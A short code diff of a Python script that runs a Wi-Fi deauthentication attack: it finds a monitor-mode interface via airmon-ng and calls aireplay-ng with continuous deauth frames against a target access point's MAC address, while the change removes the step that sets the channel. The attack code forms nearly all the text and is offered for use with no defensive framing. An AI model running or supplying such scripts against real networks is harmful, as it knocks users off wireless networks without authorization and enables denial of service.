@@ -35,7 +35,6 @@ def set_channel(channel):
     subprocess.run(["iwconfig", "wlan0mon", "channel", channel])
 
 def deauth_attack(mac_address):
-    global channel
     # Get the current interface name
     output = subprocess.check_output(["airmon-ng"])
     interface_name = None
@@ -46,10 +45,6 @@ def deauth_attack(mac_address):
     if interface_name is None:
         print("Failed to get interface name")
         return
-
-    # Set the channel
-    subprocess.run(["iwconfig", interface_name, "channel", channel])
-
     # Perform deauth attack
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
     
